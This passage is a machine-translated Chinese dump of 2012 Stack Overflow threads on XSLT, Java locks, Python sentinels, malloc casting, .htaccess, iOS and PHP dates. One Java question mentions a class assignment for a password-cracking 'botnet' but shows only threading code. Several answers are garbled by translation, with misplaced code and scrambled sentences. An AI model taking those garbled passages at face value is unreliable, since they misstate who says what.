这是一个使用**xsl:key**的 XSLT1.0 解决方案（感谢 Martin！），这通常是解决问题的最有效方法。本质上，您正在尝试按**Type**分组，因此要获得不同的家庭成员类型，您可以像这样定义一个键

```
<xsl:key name="Type" match="Type" use="." /> 
```

然后对于您的标题行，要实际获取不同的类型，您需要遍历所有类型，但只选择键中首先出现的记录以获取它们的给定值

```
<xsl:apply-templates 
   select="//Type[generate-id() = generate-id(key('Type', .)[1])]" 
   mode="header" /> 
```

（header的模式是因为Type记录会在一个单独的地方为家庭成员匹配，所以需要区分匹配的模板）

接下来，您将选择每个**Person**记录，并且对于每个此类记录，您将再次选择不同的类型，但这次将当前**Person**记录作为参数传递，以便您可以提取相关的家庭成员

```
<xsl:apply-templates 
   select="//Type[generate-id() = generate-id(key('Type', .)[1])]" 
   mode="family">
   <xsl:with-param name="Person" select="." />
 </xsl:apply-templates> 
```

然后在此的匹配模板中（使用家庭模式），您可以输出该类型的相关家庭成员

这是完整的 XSLT

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:output method="xml" indent="yes"/>
   <xsl:key name="Type" match="Type" use="." />

   <xsl:template match="/*">
      <xsl:text>Name</xsl:text>
      <xsl:apply-templates select="//Type[generate-id() = generate-id(key('Type', .)[1])]" mode="header" />
      <xsl:text>&#10;</xsl:text>
      <xsl:apply-templates select="Person" />
   </xsl:template>

   <xsl:template match="Person">
      <xsl:value-of select="Name" />
      <xsl:apply-templates select="//Type[generate-id() = generate-id(key('Type', .)[1])]" mode="family">
         <xsl:with-param name="Person" select="." />
      </xsl:apply-templates>
      <xsl:text>&#10;</xsl:text>
   </xsl:template>

   <xsl:template match="Type" mode="header">
      <xsl:text>;</xsl:text>
      <xsl:value-of select="." />
   </xsl:template>

   <xsl:template match="Type" mode="family">
      <xsl:param name="Person" />
      <xsl:text>;</xsl:text>
      <xsl:value-of select="$Person/FamilyMembers/FamilyMember[Type=current()]/Name" />
   </xsl:template>
</xsl:stylesheet> 
```

当应用于您的 XML（假设单个根元素）时，输出以下内容

```
Name;Sister;Brother;Father
John;Lisa;Tom;
Daniel;;;Peter 
```

这确实假设每个人不能有超过一个兄弟或姐妹等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T12:02:12.557

**样式表**

```
<?xml version='1.0'?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:output method="text"/>

<xsl:template match="/">
    <xsl:text>Name;Sister;Brother;Father&#xd;</xsl:text>
    <xsl:for-each select="Persons/Person">
        <xsl:variable name="name" select="Name"/>
        <xsl:variable name="others">
            <xsl:value-of select="FamilyMembers/FamilyMember[Type/text()='Sister']/Name/text()"/>
            <xsl:text>;</xsl:text>
            <xsl:value-of select="FamilyMembers/FamilyMember[Type/text()='Brother']/Name/text()"/>
            <xsl:text>;</xsl:text>
            <xsl:value-of select="FamilyMembers/FamilyMember[Type/text()='Father']/Name/text()"/>
            <xsl:text>&#xd;</xsl:text>          
        </xsl:variable>
        <xsl:value-of select="concat($name,';',$others)"/>
    </xsl:for-each> 
</xsl:template>

</xsl:stylesheet> 
```

**应用于 XML 时（修改为格式良好）：**

```
<Persons>
    <Person>
        <Name>John</Name>
        <FamilyMembers>
            <FamilyMember>
                <Name>Lisa</Name>
                <Type>Sister</Type>
            </FamilyMember>
            <FamilyMember>
                <Name>Tom</Name>
                <Type>Brother</Type>
            </FamilyMember>
        </FamilyMembers>
    </Person>
    <Person>
        <Name>Daniel</Name>
        <FamilyMembers>
            <FamilyMember>
                <Name>Peter</Name>
                <Type>Father</Type>
            </FamilyMember>
        </FamilyMembers>
    </Person>
</Persons> 
```

**结果**

```
Name;Sister;Brother;Father
John;Lisa;Tom;
Daniel;;;Peter 
```

***希望这可以帮助。***

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T12:04:21.783

我尝试了 XSLT 2.0：

```
<xsl:stylesheet 
  version="2.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:xs="http://www.w3.org/2001/XMLSchema"
  exclude-result-prefixes="xs">

<xsl:param name="sep" as="xs:string" select="';'"/>

<xsl:key name="k1" match="FamilyMember" use="Type"/>

<xsl:output method="text"/>

<xsl:variable name="cols" as="xs:string*" select="('Name', distinct-values(//Person/FamilyMembers/FamilyMember/Type))"/>

<xsl:template match="/">
  <xsl:value-of select="$cols" separator="{$sep}"/>
  <xsl:text>&#10;</xsl:text>
  <xsl:apply-templates select="//Person"/>
</xsl:template>

<xsl:template match="Person">
  <xsl:value-of select="Name"/>
  <xsl:variable name="cells" as="xs:string*" select="
    for $col in $cols[position() gt 1] return (key('k1', $col, current())/Name, '')[1]"/>
  <xsl:sequence select="if (not(empty($cells))) then concat($sep, string-join($cells, $sep)) else ()"/>  
  <xsl:text>&#10;</xsl:text>
</xsl:template>

</xsl:stylesheet> 
```

变换

```
<Persons>
<Person>
    <Name>John</Name>
    <FamilyMembers>
        <FamilyMember>
            <Name>Lisa</Name>
            <Type>Sister</Type>
        </FamilyMember>
        <FamilyMember>
            <Name>Tom</Name>
            <Type>Brother</Type>
        </FamilyMember>
    </FamilyMembers>
</Person>
<Person>
    <Name>Daniel</Name>
    <FamilyMembers>
        <FamilyMember>
            <Name>Peter</Name>
            <Type>Father</Type>
        </FamilyMember>
    </FamilyMembers>
</Person>
</Persons> 
```

进入

```
Name;Sister;Brother;Father
John;Lisa;Tom;
Daniel;;;Peter 
```

我以后可能会尝试将其转换为 XSLT 1.0 解决方案，但我猜如果 Tim C 已经尝试在 XSLT 1.0 中解决它，他会更快。

# java - 永远不会完成最终的 While 循环

> ID：13287868
> 
> 赞同：0
> 
> 时间：2012-11-08T11:09:58.993
> 
> 标签：java, io, locking

我有一个任务，我基本上必须编写一个小型僵尸网络。我们得到了用户名和加密密码的列表。我们还获得了解密这些密码的代码。任务是使用 TCP 破解 Master/Slave 关系中的密码。密码破解类似于字典攻击，您将加密的密码与字典进行比较。

这意味着主机（服务器）必须向从机（客户端）发送指令。这些指令是加密的密码，在字典中从哪里开始查找，以便不同的slave可以同时查看字典的不同部分，加快解密过程。

就我个人而言，我必须照顾主人。该过程是这样工作的：

主（类）在新线程中启动会话（实现可运行的类）。Session 为每个 Slave 创建单独的 InputStreamListeners（实现 Runnable 的类），以便可以在单独的线程上处理输入。当 Slave 完成后，所有解密的密码都被发送到 InputStreamListener 并添加到字符串的 ArrayList 中。然后这个列表将被发送到 Session，并希望添加到 ArrayLists 列表中（因此 ArrayList>）。会话确实收到所有密码。Socket 在 InputStreamListener 中关闭，Slave 关闭。对我来说，这意味着该侦听器的任务现在应该关闭，并且不再位于 ExecutorService 线程池中。

到目前为止，我们一次只与 1 个奴隶合作。当 InputStreamListener 关闭结束时，代码如下所示：

```
try {
        writer.println("Disconnecting Slave...");
        scanner.close();
        writer.close();
        slave.getSocket().close();
        Master.messageServer("Slave Socket Close");
    } catch (IOException ex) {
        Master.messageServer("[" + ip + "]: Problem closing Socket for Slave: ");
        Master.messageServer("[" + ip + "]:" + ex.getMessage());
    }
    while(true) {
        Master.messageServer("Trying Lock");
        if(session.lock.tryLock()) {
            try {
                session.addResults(results);
                Master.messageServer("Added Results to Session.");
                break;
            } finally {
                session.lock.unlock();
            }
        }
    } 
```

InputStreamListener 到达 while 循环，但只打印一次“尝试锁定”。如果它被锁定，这意味着现在应该向控制台发送“尝试锁定”的垃圾邮件，直到它可以实际到达该方法，然后打印“已将结果添加到会话”。

会话中的代码如下所示：

```
public void addResults(ArrayList<String> list) {
    lock.lock();
    try {
        results.add(list);
    } finally {
        lock.unlock();
    }
} 
```

该锁是可重入锁。

这当然是完成的，因此 2 个或更多 InputStreamListeners 不会同时访问该方法。

我根本不知道为什么会发生这种情况，以及为什么程序不起作用。从逻辑上讲，它似乎正在工作。除此之外，它只是将信息放入创建 txt 文件的新方法中。帮助？

# django-crispy-forms - django-crispy-forms：FormHelper 的 help_text_inline 没有按预期工作

> ID：13287883
> 
> 赞同：1
> 
> 时间：2012-11-08T11:11:04.300
> 
> 标签：django-crispy-forms

对于以下型号：

```
class MyModel(models.Model):
    name = models.CharField(max_length=110, help_text="Some sample help text.")
    def __unicode__(self):
        return u'%s' % (self.name) 
```

以及以下模型形式：

```
class MyModelForm(forms.ModelForm):
    def __init__(self, *args, **kwargs):
        super(MyModelForm, self).__init__(*args, **kwargs)
        self.helper = FormHelper()
        self.helper.form_id = 'id-myModelForm'
        self.helper.form_class = 'form-horizontal'
        self.helper.form_action = 'my_model_form_url'
        self.helper.form_error_title = 'Form Errors'
        self.helper.help_text_inline = True
    class Meta:
        model = MyModel 
```

使用以下模板：

```
{% extends "base.html" %}

{% block content %}
    {% load crispy_forms_tags %}
    {% crispy form %}
{% endblock %} 
```

模型中定义的**help_text**根本不会被渲染。如果我更改为`self.helper.help_text_inline = False`而不是，它确实会被渲染`self.helper.help_text_inline = True`，但这不是我想要的。

如何让 help_text 显示`self.helper.help_text_inline = True`？

base.html 完全正确，包含所有引导文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-09T15:17:28.797

这是因为`help_text_inline`and`error_text_inline`不能设置为相同的值才能工作。如果设置`help_text_inline`为`True`，则需要设置`error_text_inline`为`False`。如果您不这样做，则不会显示帮助文本消息，以便在发生错误时显示表单错误。

直到现在我都没有仔细考虑过这个问题。所以最好的办法可能是添加一个日志警告，告诉用户要小心。如果设置了一个，可能会自动覆盖另一个标志的默认行为。我愿意接受建议。

# python - 使用 None 作为关键字参数的参数

> ID：13287887
> 
> 赞同：3
> 
> 时间：2012-11-08T11:11:21.273
> 
> 标签：python, chaining

> **可能重复：**
> [python - 返回默认值](https://stackoverflow.com/questions/12265695/python-returning-a-default-value)

我在一个类中有一个函数：

```
def foo(self, value = None):
    if value is None:
        return self.value
    self.value = value
    return self 
```

这是一个 getter 和 setter 合二为一的优点，我可以像这样链接函数：

```
three = anInstanceOfMyClass.foo(3).bar().foo() 
```

当我这样做时出现问题：

```
shouldBeNoneButIsThree = anInstanceOfMyClass.foo(3).foo(None).foo() 
```

这里 foo 认为我没有通过参数。我可以通过以下方式避免这种情况：

1.  将值设置为一些奇怪的对象，例如随机字符串
2.  在构造函数中创建一个对象实例，其值为默认值

两者都似乎有点太多的工作，有什么更简单的方法？

为某事设定价值

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-08T11:13:04.470

您需要使用哨兵来检测未设置默认值：

```
sentinel = object()

def foo(self, value=sentinel):
    if value is not sentinel:
        print("You passed in something else!") 
```

这是有效的，因为一个实例`object()`将始终拥有它自己的内存 ID，因此`is`只有在保留确切值的情况下才会返回 True。*任何其他值*都不会注册为同一个对象，包括`None`.

您将在各种不同的 python 项目中看到上述技巧的不同变体。以下任何哨兵也可以工作：

```
sentinel = []
sentinel = {} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T11:14:45.787

使用哨兵对象值是相当普遍的；这就是图书馆所做的[`abcoll.py`](http://hg.python.org/cpython/file/2.7/Lib/_abcoll.py#l454)：

```
 __marker = object()

   def pop(self, key, default=__marker):
       ...
       if default is self.__marker: 
```

请注意，哨兵对象应直接在类中定义。

# c - 是否有必要对 malloc 和 calloc 进行类型转换

> ID：13287888
> 
> 赞同：9
> 
> 时间：2012-11-08T11:11:35.310
> 
> 标签：c, malloc, calloc

> **可能重复：**
> [我要转换 malloc 的结果吗？](https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc)

我在谷歌上搜索找出**malloc**和**calloc**类型转换的原因。但是，我只发现***malloc****的类型转换是不必要的，因为它返回 void 指针***，但是**calloc**呢。**这也是calloc**的原因？？？**

 **现在，如果我们回到第一点，关于**malloc**和**calloc**的返回值。然后，我发现，*两者都返回了分配的空间*。所以，我在这里有点困惑。所以，我的问题是

> 1.  **malloc**和**calloc**的返回值是多少
>     
>     
> ***   是否有必要对**malloc**和**calloc**进行类型转换。为什么？**

 *** * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-08T11:14:07.130

> malloc 和 calloc 的返回值是多少？

它是指向`void`( `void*`) 的指针。

> 是否有必要对 malloc 和 calloc 进行类型转换。为什么？

不，因为从`void`指针到对象指针的转换是隐式的。

> **C11 (n1570), § 6.3.2.3 指针指向**
> 的指针`void`可以转换为指向任何对象类型的指针或从指向任何对象类型的指针转​​换。

它适用于`malloc`和`calloc`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-08T11:14:34.263

`malloc()`或可以分配给任何指针类型的`calloc()`返回值。在 C 中，没有必要进行类型转换，因为它是由编译器隐式完成的。但是在 C++ 中，如果你不进行类型转换，它会给你错误`void *``void*`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T11:13:14.903

> malloc() 和 calloc() 的返回值是多少？

```
void *malloc(size_t size);
void *calloc(size_t nmemb, size_t size); 
```

`void*`由两个函数返回。

> 是否有必要对 malloc 和 calloc 进行类型转换。为什么？

不，不需要类型转换。`malloc()`and函数返回一个指向已分配内存的指针，该`calloc()`指针适合任何类型的变量对齐。出错时，这些函数返回`NULL`. `NULL`也可以通过 `malloc()`大小为零的成功调用返回，或者通过成功调用`calloc()`with `nmemb`or size 等于 0 来返回。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-08T11:15:59.517

`malloc`和的返回值`calloc`是一个`void*`。这些函数分配的堆内存空间的地址。

这两个函数都分配内存。它们之间的唯一区别是

*   malloc 只是分配内存。
*   calloc 分配内存并将其初始化为 0。

在 C 中，不建议强制转换这些函数的返回值。

在 C++ 中强制转换。****

# php - 使用 PHP $_GET 和 .htaccess 拒绝 url

> ID：13287889
> 
> 赞同：1
> 
> 时间：2012-11-08T11:11:35.217
> 
> 标签：php, .htaccess, get

我`index.php`只有一条线

```
<?php echo $_GET['a']; ?> 
```

如果我输入`url`：

```
http://localhost/test/?a=abc..... 
```

我明白了

```
abc..... 
```

但是如果我创建`.htaccess`并编写：

```
RewriteEngine on
RewriteRule ^([a-z]+)$ ?a=$1 
```

如果我输入`url`：

```
http://localhost/test/abc..... 
```

我只得到`abc`（没有点`.....`）

为什么会这样？

我想获得一个`404 error`if`abc.....`字符串已发送。我怎样才能归档这个？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:14:01.267

尝试

```
RewriteRule ^([a-z]+)$ ?a=$1 [L]
RewriteRule .* 404.php 
```

如果第一个规则匹配，它会将值放入`a`，否则他会将用户发送到`404.php`

**另一个编辑**

对不起，我一开始误解了你的问题。

您的正则表达式仅在此处捕获拉丁（英语）字母：`^([a-z]+)$`，因此，如果您想包含点，请使用：`^([a-z\.]+)$`或者如果您想捕获任何内容，请使用：`^(.*)$`

**原创**- 我将其保留在这里，因为它可能仍然对您有用

利用

```
RewriteRule ^([a-z]+)$ ?a=$1 [QSA] 
```

这将在您的重写规则之后传递查询字符串。

有关该主题的更多信息，请尝试[这篇文章](http://www.simonecarletti.com/blog/2009/01/apache-rewriterule-and-query-string/)。

# ios - 如何在 SASlideMenu 中默认设置选定的第一个单元格？

> ID：13287892
> 
> 赞同：2
> 
> 时间：2012-11-08T11:11:40.287
> 
> 标签：ios, xcode, uitableview, saslidemenu

我正在将此脚本用于幻灯片菜单“ [SASlideMenu](http://www.cocoacontrols.com/platforms/ios/controls/saslidemenu) ”，并且我试图默认选择第一项，但没有成功。有人知道怎么做吗？

我试过这个：

```
(void) viewDidLoad{
    [super viewDidLoad];

    ...

    self.tableView.delegate = self;
    NSString *CellIdentifier = @"homeCell";
    UITableViewCell *homeCell = [self.tableViewdequeueReusableCellWithIdentifier:CellIdentifier]; 
    [homeCell setSelected:YES];

} 
```

**更新（改进的解释）**

我在“SASlideMenuViewController.m”中这样做

**更新 2**

关于主要问题，我想问一下当用户输入 applicationWillEnterForeground 时如何选择第一个单元格并切换到主页？PS我不想为此提出另一个问题，因为它可以被视为“重复”。

**更新 3** 当用户在另一个视图上时，我不知道如何切换到主页。例如，当他回到应用程序（前台）时，我们将用户切换到主页，但这在下一种情况下不起作用；在 SASlideMenu 我有类别列表，当我转到其中一个类别然后从应用程序退出并再次返回应用程序时，它会将我切换到主页，这没关系。但是，当我单击 SASlideMenu 中的一个类别，然后单击其中一篇文章的类别视图内部并退出应用程序并再次输入时，它不会将我切换到主页，我不知道为什么。它是基于导航的应用程序。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T07:16:09.617

## 问题1：应用启动时默认选择第一项

假设您正在使用`SASlideMenu`问题中提到的代码。在您的`ExampleMenuViewController`课程中，您需要添加以下内容，

```
- (void)viewDidAppear:(BOOL)animated {
    [super viewDidAppear:animated];

    NSIndexPath *indexPath = [NSIndexPath indexPathForRow:0 inSection:0];
    if (indexPath) {
        [self.tableView selectRowAtIndexPath:indexPath animated:NO scrollPosition:UITableViewScrollPositionNone];
    }
} 
```

***_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* *_* __ *_* __ *_* __ _ *_* __ *_* __ *_***

## 问题2：默认选择第一项并设置主屏幕`applicationWillEnterForeground`

`ExampleMenuViewController.h`在您的文件中添加以下方法声明，

```
@interface ExampleMenuViewController :SASlideMenuViewController<SASlideMenuDataSource>

- (void)selectFirstRowAndSetHomePage;

@end 
```

`ExampleMenuViewController.m`在您的文件中添加以下方法，

```
- (void)selectFirstRowAndSetHomePage {

    NSIndexPath *indexPath = [NSIndexPath indexPathForRow:0 inSection:0];
    if (indexPath) {
        [self.tableView selectRowAtIndexPath:indexPath animated:NO scrollPosition:UITableViewScrollPositionNone];
    }

    NSString *identifier= [self.slideMenuDataSource initialSegueId];
    if (identifier) {
        [self performSegueWithIdentifier:identifier sender:self];
    }
} 
```

`SASlideMenuAppDelegate.h`在您的课程中实施以下内容，

```
#import "ExampleMenuViewController.h" 
```

和，

```
- (void)applicationWillEnterForeground:(UIApplication *)application {

    ExampleMenuViewController *exampleMenuViewController = (ExampleMenuViewController *)self.window.rootViewController;
    [exampleMenuViewController selectFirstRowAndSetHomePage];
} 
```

那应该有帮助。

***_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* __ *_* *_* __ *_* __ *_* __ _ *_* __ *_* __ *_***

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T15:01:23.773

这应该适合你：

```
- (void)viewDidAppear:(BOOL)animated {
    [super viewDidAppear:animated];
    NSIndexPath *indexPath = [NSIndexPath indexPathForRow:0 inSection:0];
    [self.tableView selectRowAtIndexPath:indexPath animated:NO scrollPosition:UITableViewScrollPositionNone];
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T11:58:17.480

检查此代码：

```
NSIndexPath *indexPath = [[NSIndexPath alloc] initWithIndex:0];
UITableViewCell *homeCell = [[self.tableView cellForRowAtIndexPath:indexPath] setSelected:YES]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T12:10:55.380

什么时候`viewDidLoad`叫你的桌子还是空的。您甚至没有使用表格内的单元格。

试试这个代码：

```
NSIndexPath firstCellIndex = [NSIndexPath indexPathForRow:0 inSection:0];
[self.tableView selectRowAtIndexPath:firstCellIndex
                            animated:NO 
                      scrollPosition:UITableViewScrollPositionNone]; 
```

并将其放入`viewDidAppear`.

# php - AJAX 加载消息

> ID：13287895
> 
> 赞同：0
> 
> 时间：2012-11-08T11:11:52.893
> 
> 标签：php, jquery, ajax

我想在通过 AJAX 检索结果时显示加载消息，但我不能。有人可以帮忙吗？

```
<script type="text/javascript">

$(function() {

    $(".search_button").click(function() {
        // getting the value that user typed
        var searchString    = $("#search_box").val();
        // forming the queryString
        var data            = 'search='+ searchString;

        // if searchString is not empty
        if(searchString) {
            // ajax call
            $.ajax({
                type: "POST",
                url: "do_search.php",
                data: data,
                beforeSend: function(html) { // this happens before actual call
                    $("#results").html('');
                    $("#search_result_box").show();
                    $("#searchresults").show();
                    $(".word").html(searchString);
               },
               success: function(html){ // this happens after we get results
                    $("#results").show();
                    $("#results").append(html);
              }
            });   
        }
        return false;
    });
});
</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T11:20:18.290

Why not using beforeSend and success methods to show/hide a loading message

```
beforeSend: function(html) { // this happens before actual call

  // DO SOMEHTING HERE TO SHOW YOUR LOADING MESSAGE AS $('#loading').show();

  $("#results").html('');
  $("#search_result_box").show();
  $("#searchresults").show();
  $(".word").html(searchString);
},
success: function(html){ // this happens after we get results

  // DO SOMEHTING HERE TO HIDE YOUR LOADING MESSAGE AS $('#loading').hide();

  $("#results").show();
  $("#results").append(html);
} 
```

rgds

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T11:15:50.813

我会在触发 AJAX 请求之前更改消息。所以，点击或提​​交：

```
<script>
$('form').on('submit', function(e) {
    e.preventDefault();
    $('#response').html('<p>Loading&hellip;</p>');
    $.post($(this).attr('action'), $(this).serialize(), function(response) {
        // do something here with the response
        $('#response').html('<p>Request successful.</p>');
    });
});
</script> 
```

# c#-4.0 - 如何跟踪 StreamInSight 中的更改？

> ID：13287897
> 
> 赞同：1
> 
> 时间：2012-11-08T11:11:58.697
> 
> 标签：c#-4.0, sql-server-2008-r2, service-broker, complex-event-processing, streaminsight

在我的项目中，我需要跟踪数据库表中新插入的行。并将这些行提供给 .net 应用程序进行处理。我通过了 StremInSight，它非常适合。所以我想知道的是有什么选项可以捕获 StreamInSight 中的变化吗？否则我怎么能同时加入 ServiceBroker 和 StremInSight。我的意思是我们可以使用服务代理将更改流式传输到 StreamInsight 吗？

# java - 括号应该用于单行条件语句吗？

> ID：13287898
> 
> 赞同：4
> 
> 时间：2012-11-08T11:12:00.147
> 
> 标签：java, c++, c

除了可读性之外，当使用和不使用括号编写单行循环/条件语句时，性能或编译时间是否有任何差异？

例如，以下之间是否有任何区别：

```
if (a > 10) 
    a = 0; 
```

和

```
if (a > 10)
{
    a = 0;
} 
```

?

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-08T11:20:21.347

当然性能上没有区别。但是引入错误的可能性是有区别的：

```
if (a>10)
  a=0; 
```

如果有人扩展代码并稍后编写，

```
if (a>10)
  a=0;
  printf ("a was reset\n"); 
```

由于缺少大括号，这将始终被打印。有些人要求你总是使​​用大括号来避免这种错误。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-08T11:18:33.440

与几个答案相反，在编译时存在*有限但可以忽略不计的性能差异。*运行时任何类型的差异都为零。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-08T11:15:04.353

不，没有区别，编译器会去掉无意义的大括号、换行符等。

编译时间将略有不同，但如此微小，以至于您阅读此答案所花费的时间远远多于您恢复编译速度的时间。随着计算能力的增加，这个成本会进一步下降，但降低可读性的成本不会。

简而言之，做可读的事情，它在任何其他意义上都没有任何有用的区别。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-08T11:18:36.343

机器代码不包含这样的大括号。编译后就没有了`{}`。使用最易读的形式。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-08T11:17:39.273

好吧，它们在运行时当然没有区别。但是为了维护您的代码，您当然应该使用第二种方式。

为什么我这么说是，假设将来，您需要在块中*添加更多行*来*扩展它们*。然后，如果您将第一种方式合并到旧代码中，那么您必须在添加一些新代码之前添加。在第二种情况下您不需要这样做。`if-else`*`braces`*

 *因此，将来向第二种方式添加代码比向第一种方式添加代码要容易得多。

此外，如果您使用的是第一种方式，您会出现输入错误，例如`semi-colon`在 your 之后`if`，如下所示：-

```
if (a > 0);
    System.out.println("Hello"); 
```

因此，您可以看到您的`Hello`将始终被打印出来。如果您已将这些错误`curly braces`附加到您的`if`.

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2012-11-08T11:43:44.100

这取决于其余的编码指南。*如果*左大括号始终单独在一条线上，我认为放下大括号没有任何问题。但是，如果左大括号位于`if`行尾，我发现在添加内容时很容易忽略。所以我会去：

```
if ( a > 10 ) {
    a = 0;
} 
```

无论行数如何，或者：

```
if ( a > 10 )
{
    //  several statements...
} 
```

和：

```
if ( a > 10 )
    a = 0; 
```

当只有一个语句时。然而，重要的是所有代码都是一致的。如果您正在处理使用几种不同样式的现有代码库，我总是在新代码中使用大括号，因为您不能指望代码样式来确保它们是否存在，它们会在高度可见的位置。*

# javascript - jQuery GMap 隐藏标签

> ID：13287903
> 
> 赞同：0
> 
> 时间：2012-11-08T11:12:15.733
> 
> 标签：javascript, jquery, google-maps

我一直在为此寻找解决方案，但找不到任何解决方案。

我有一个用[jQuery GMap](http://gmap.nurtext.de/)创建的地图 我想做的是从地图中删除国家标签。甚至删除所有标签。怎么做？

代码：

```
function prepareData(json){
    $("#tweets_map").gMap({ 
        maptype: G_NORMAL_MAP,
        controls: ["GSmallZoomControl"],
        markers: json,
        zoom: 5
    });
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T11:44:07.160

根据您的[![](../Images/1ae9273e20cceb6fe5e05b7465cd4f60.png)google-maps](/questions/tagged/google-maps "显示标记为“谷歌地图”的问题")标签，它实际上非常简单：

创建一个 StyledMapType 并传递您想要的样式（`visibility: "off"`to `labels`）。

在这里查看一个工作示例：http: [//jsfiddle.net/RASG/vA4eQ/](http://jsfiddle.net/RASG/vA4eQ/)

单击“隐藏/显示标签”进行切换。

# php - strtotime 英国约会怪事

> ID：13287904
> 
> 赞同：1
> 
> 时间：2012-11-08T11:12:20.520
> 
> 标签：php

也许我需要更多的睡眠，但我无法解释 strtotime 有点奇怪。

日期的英国本地化表示法`d/m/Y`是我在 CSV 中从外部来源获得的要插入 MySQL 的内容（格式：）`Y-m-d`。

当然，我看到的直接问题是 PHP（使用 时`strtotime`）将这些转换错误。下面是一个`var_dump`带有后缀的字段值示例`strtotime` `var_dump`：

```
string(10) "13/07/1992" string(19) "1969-12-31 16:00:00" // This one is odd
string(10) "07/09/1992" string(19) "1992-07-09 00:00:00"
string(10) "09/11/1992" string(19) "1992-09-11 00:00:00" 
```

最初我认为这是因为 PHP 不支持英国表示法（[http://www.php.net/manual/en/datetime.formats.date.php](http://www.php.net/manual/en/datetime.formats.date.php)）并且认为这是美国日期但是这并不能解释为什么如果我将我的功能更改`/`为`-`：

```
date('Y-m-d H:i:s', strtotime(str_replace('/', '-', $string_time))) 
```

相同的日期确实有效：

```
string(10) "13/07/1992" string(19) "1992-07-13 00:00:00"
string(10) "07/09/1992" string(19) "1992-09-07 00:00:00"
string(10) "09/11/1992" string(19) "1992-11-09 00:00:00" 
```

事实上，我有一个包含 200 个日期的测试集，它们都在这个`-`符号下工作。

根据文档，这里不应该应用相同的规则吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:16:37.187

美国格式使用斜线，因为那是那里的约定。通常，不使用破折号。`strototime()`的行为很简单：

*   两位数，斜线，两位数，斜线，四位数？美国格式（月，然后日）。
*   两位数，破折号，两位数，破折号，四位数字？国际格式（日，然后月）。

`strototime()`可以在[此处](http://www.php.net/manual/en/datetime.formats.date.php)找到更技术性的格式列表（以及如何解释它们） 。

您可能还对[DateTime::createFromFormat 感兴趣](http://www.php.net/manual/en/datetime.createfromformat.php)。

# winapi - 如何通过 HWND 获取窗口类？

> ID：13287908
> 
> 赞同：1
> 
> 时间：2012-11-08T11:12:26.857
> 
> 标签：winapi, visual-c++, wtl

我需要检查光标下的窗口类。我怎样才能得到窗口类`HWND`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-11T18:15:14.210

如果您有窗口的句柄，则只需使用[GetClassName即可](http://msdn.microsoft.com/en-us/library/windows/desktop/ms633582%28v=vs.85%29.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T01:28:12.323

[`ChildWindowFromPoint`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms632676%28v=vs.85%29.aspx)和朋友们 - 请务必仔细阅读禁用/不可见的窗口。

请参阅：[如何检测屏幕上特定点的窗口/控件？](https://stackoverflow.com/questions/1236412/how-to-detect-what-window-control-is-at-a-specific-point-onscreen)

# asp.net-mvc - ASP.NET MVC 如何创建控制器实例

> ID：13287917
> 
> 赞同：0
> 
> 时间：2012-11-08T11:12:50.350
> 
> 标签：asp.net-mvc

ASP.NET MVC 如何为请求创建控制器实例？它是否为不同的请求创建不同的实例？如果是这样，这是否意味着 ViewBag 不能在控制器中的操作之间共享，尽管它是控制器中的成员？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T11:14:29.813

每个请求都会调用它自己的控制器实例。因此，`ViewBag`对于每个请求也是本地的。

# sharepoint-2010 - 如何在 Sharepoint 2010 中显示来自多个列表和来源的数据？

> ID：13287920
> 
> 赞同：0
> 
> 时间：2012-11-08T11:12:57.413
> 
> 标签：sharepoint-2010

我想要一个显示项目列表的 Web 部件。这不是共享点列表，而是来自多个数据源的列表，例如输出共有 8 列

2 列来自共享点列表（用户），2 列来自自定义共享点列表，3 列从 Web 服务访问到外部系统（例如来自 yahoo 的股价），1 列使用计算（复杂计算）其他 5 列

我该怎么做？我需要什么控件/对象？

我最感兴趣的是什么控件/对象最能输出数据。假设我在 Visual Studio 代码中有一个具有 8 个属性的自定义对象。我不认为我可以用 SPView 做到这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T11:28:32.360

